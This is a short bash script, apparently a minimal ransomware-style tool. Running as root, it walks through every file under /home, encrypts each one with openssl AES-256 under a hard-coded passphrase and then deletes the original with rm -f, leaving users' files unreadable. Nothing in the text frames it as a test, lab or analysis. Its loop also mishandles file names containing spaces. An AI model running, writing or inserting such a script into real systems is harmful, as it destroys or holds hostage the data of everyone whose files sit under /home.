#!/bin/bash
if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi

for f in $(find /home -not -name "*.enc"); do
	if [ -f $f ]; then
		openssl enc -aes-256-cbc -salt -in "$f" -out "$f".enc -k "IDKFA";
		echo -e "File: [$f] encrypted";
		rm -f "$f";
	fi
done
